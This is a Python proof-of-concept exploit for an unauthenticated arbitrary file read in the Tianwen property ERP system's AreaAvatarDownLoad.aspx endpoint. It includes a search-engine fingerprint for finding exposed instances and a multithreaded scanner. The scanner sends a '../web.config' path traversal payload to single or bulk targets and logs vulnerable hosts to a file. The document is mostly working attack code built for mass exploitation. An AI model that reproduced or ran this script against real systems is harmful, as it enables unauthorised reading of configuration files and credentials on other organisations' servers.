# 天问物业ERP系统 AreaAvatarDownLoad.aspx 任意文件读取漏洞
# body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
# 产品简介：天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案，实现物管公司的管理升级；以平台搭建和资源整合为基础，建立社区O2O服务平台，向物管公司提供旨在完善服务、方便业主、增加收益为目标的智慧小区综合服务平台，实现物业公司的服务转型。
# 漏洞概述：天问物业ERP系统 AreaAvatarDownLoad.aspx 接口处存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。


import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m███████╗██████╗ ██████╗     █████╗  █████╗ ██████╗ 
\x1b[36m██╔════╝██╔══██╗██╔══██╗   ██╔══██╗██╔══██╗██╔══██╗
\x1b[34m█████╗  ██████╔╝██████╔╝   ███████║███████║██║  ██║
\x1b[35m██╔══╝  ██╔══██╗██╔═══╝    ██╔══██║██╔══██║██║  ██║
\x1b[31m███████╗██║  ██║██║███████╗██║  ██║██║  ██║██████╔╝
\x1b[33m╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                                                                                                                                    
    --author:Kucei  --Version:天问物业ERP系统_AreaAvatarDownLoad.aspx_任意文件读取漏洞 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                  
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('天问物业ERP系统_AreaAvatarDownLoad.aspx_任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'configSections' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('天问物业ERP系统_ReadFile.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()